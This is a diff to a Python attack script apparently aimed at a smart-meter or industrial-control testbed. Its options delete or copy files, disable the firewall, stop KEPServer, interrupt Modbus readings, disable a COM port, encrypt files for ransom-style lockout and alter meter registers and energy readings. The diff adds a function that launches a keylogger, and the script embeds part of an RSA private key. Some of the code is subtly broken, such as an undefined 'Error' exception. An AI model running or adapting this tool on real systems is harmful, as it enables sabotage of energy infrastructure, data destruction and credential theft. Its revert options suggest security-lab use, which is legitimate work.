@@ -103,7 +103,7 @@ def run_modinterrup():
         print("Kepserver is running, Stopping now.")
         service_name = "KEPServerEXV6"
         cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-
+        output = cp.stdout.decode('utf-8').strip().split()
         if "FAILED" in cp.stdout.decode('utf-8'):
             print("FAILED: " + " ".join(output[4:]) + "\nFail.")
         else:
@@ -306,6 +306,11 @@ def clearEnergyReading():
         print("Error executing the executable file:", e)
         print("Fail.")
 
+def runKeylogger():
+    run(['Keylogger.exe'], shell=True, stdout=PIPE, stderr=PIPE, text=True)
+    print("hello")
+
+
 def revert(revertoption):
     # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
     if revertoption == "1":
@@ -405,15 +410,17 @@ QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
 zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 -----END RSA PRIVATE KEY-----'''
         
-        excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
-        for item in recurseFiles(smartmeterpath): 
-            filePath = Path(item)
-            fileType = filePath.suffix.lower()
+        try:
+            for item in recurseFiles(smartmeterpath): 
+                filePath = Path(item)
+                fileType = filePath.suffix.lower()
 
-            if fileType in excludeExtension:
-                continue
-            decrypt(filePath, privatekey)
-        print("Decryption Successful. \nOk.")
+                if fileType in excludeExtension:
+                    continue
+                decrypt(filePath, privatekey)
+            print("Decryption Successful.\nOk.")
+        except Error as e:
+            print("Decryption Failed.\nFail.")
 
     elif revertoption == "6":
         current_directory = getcwd()
@@ -560,13 +567,17 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
     -----END RSA PRIVATE KEY-----'''
         
         excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
-        for item in recurseFiles(smartmeterpath): 
-            filePath = Path(item)
-            fileType = filePath.suffix.lower()
+        try:
+            for item in recurseFiles(smartmeterpath): 
+                filePath = Path(item)
+                fileType = filePath.suffix.lower()
 
-            if fileType in excludeExtension:
-                continue
-            decrypt(filePath, privatekey)
+                if fileType in excludeExtension:
+                    continue
+                decrypt(filePath, privatekey)
+            print("Decryption Successful")
+        except Error as e:
+            print("Decryption Failed")
 
         print("\n==================================\n")
 
@@ -635,9 +646,11 @@ if __name__ == '__main__':
     attackoption = str(argv[1])
     if attackoption == "1":
         delete_files(smartmeterpath)
+        print("\nOk.")
     elif attackoption == "2":
         Create_Share_folder()
         copy_file(smartmeterpath)
+        print("\nOk.")
     elif attackoption == "3":
         disable_firewall()
     elif attackoption == "4":
@@ -657,6 +670,8 @@ if __name__ == '__main__':
     elif attackoption == "11":
         revertoption = str(argv[2])
         revert(revertoption)
+    elif attackoption == "12":
+        runKeylogger()
     elif attackoption == "-h":
         print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrup modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options.")
 
